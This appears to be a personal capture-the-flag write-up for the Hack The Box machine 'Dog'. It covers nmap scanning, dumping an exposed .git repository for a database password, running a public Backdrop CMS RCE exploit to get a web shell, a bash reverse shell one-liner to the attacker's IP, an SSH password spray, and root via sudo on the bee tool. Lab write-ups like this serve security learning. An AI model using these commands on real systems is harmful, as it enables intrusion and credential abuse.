---
tags:
  - type/machine
  - platform/htb
  - os/linux
  - status/unsolved
  - tech/lin/sudo-abuse
  - tech/web/file-upload
  - tech/svc/smb
  - tech/cred/spray
type: machine
platform: htb
os: linux
ip: 10.129.231.223
domain: dog.htb
ports: [22, 80]
services: [http, ssh]
status: unsolved
tech_count: 4
---
## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/Dog]
└─$ nmap -sCV -p- -Pn -A --min-rate 5000 10.129.231.223 -oN nmap.log
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-12 18:02 +0900
Nmap scan report for 10.129.231.223
Host is up (0.22s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   10.129.231.223:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   222.07 ms 10.10.14.1
2   222.66 ms 10.129.231.223

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.90 seconds

```


## Initial Access

Git 디렉토리 덤프

```bash
git-dumper http://10.129.1.13/.git/ .
...
...
...
[-] Fetching http://10.129.231.223/.git/objects/fe/8bdf2b93f72978d04d31fda539aba66226a759 [200]
[-] Fetching http://10.129.231.223/.git/objects/fe/8c2ad6237f266b80444690211522fb4d197a8e [200]
[-] Fetching http://10.129.231.223/.git/objects/fe/8ff87ab0bf68dcda6ad3f5054184c89987092a [200]
[-] Fetching http://10.129.231.223/.git/objects/fe/38e85bce69f73aed5d7d9415b4a9ce0c535272 [200]
[-] Fetching http://10.129.231.223/.git/objects/fe/51717707bc36821eecd9b8329dc6b8dc920aa6 [200]
[-] Fetching http://10.129.231.223/.git/objects/fe/86d23b4507ef2735910e184a28be06f12cf0bd [200]
[-] Fetching http://10.129.231.223/.git/objects/fe/bf596134670bbc1a6ba0feeb2b5981427661da [200]
[-] Fetching http://10.129.231.223/.git/objects/fe/bd3883d790d7ded859f65b58d30b5d399edb0e [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 2873 paths from the index
                                     
```

다운받은 setting.php 내 mysql 자격증명 획득
```bash
┌──(kali㉿kali)-[~/HTB/Dog/git_dump]
└─$ cat settings.php     
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';

```


git 덤프 내 유저명 획득 `tiffany:BackDropJ2024DS2024`
```bash
┌──(kali㉿kali)-[~/HTB/Dog/git_dump]
└─$ grep -ri 'dog.htb'                      
.git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000        commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
.git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000   commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"

```


POC 다운로드
```bash
┌──(kali㉿kali)-[~/HTB/Dog]
└─$ git clone https://github.com/rvizx/backdrop-rce.git               
Cloning into 'backdrop-rce'...
remote: Enumerating objects: 11, done.
remote: Counting objects: 100% (11/11), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 11 (delta 1), reused 4 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (11/11), 5.15 KiB | 5.15 MiB/s, done.
Resolving deltas: 100% (1/1), done.

```


POC 실행
```bash
┌──(kali㉿kali)-[~/HTB/Dog/backdrop-rce]
└─$ python exploit.py http://10.129.231.223 tiffany BackDropJ2024DS2024
[>] logging in as user: 'tiffany'
[>] login successful
[>] enabling maintenance mode
[>] maintenance enabled
[>] payload archive: /tmp/bd_od3elnkc/rvzb889d6.tgz
[>] fetching installer form
[>] uploading payload (bulk empty)
[>] initial upload post complete
[>] batch id = 12; sending authorize ‘do_nojs’ and ‘do’
[>] waiting for shell at: http://10.129.231.223/modules/rvzb889d6/shell.php
[>] shell is live
[>] interactive shell – type 'exit' to quit
kali@10.129.231.223 > 
```


쉘 안정화 
```bash
bash -c "sh -i >& /dev/tcp/10.10.14.17/4444 0>&1"
```

사용자 확인
```bash
$ ls -al
total 16
drwxr-xr-x  4 root       root       4096 Aug 15  2024 .
drwxr-xr-x 19 root       root       4096 Feb  7  2025 ..
drwxr-xr-x  4 jobert     jobert     4096 Feb  7  2025 jobert
drwxr-xr-x  3 johncusack johncusack 4096 Feb  7  2025 johncusack

```

Password spray
```bash
┌──(kali㉿kali)-[~/HTB/Dog]
└─$ nxc ssh 10.129.231.223 -u users.txt -p 'BackDropJ2024DS2024' --continue-on-success -t 100
SSH         10.129.231.223  22     10.129.231.223   [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12
SSH         10.129.231.223  22     10.129.231.223   [-] jobert:BackDropJ2024DS2024
SSH         10.129.231.223  22     10.129.231.223   [+] johncusack:BackDropJ2024DS2024  Linux - Shell access!

```


획득한 자격증명으로 user.txt 획득
![[Pasted image 20260312152911.png]]

sudo로 실행할 수 있는 명령어 확인

```bash
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee

```

bee 명령어 사용하여 root 획득
```bash
 sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"
```

![[Pasted image 20260312153336.png]]
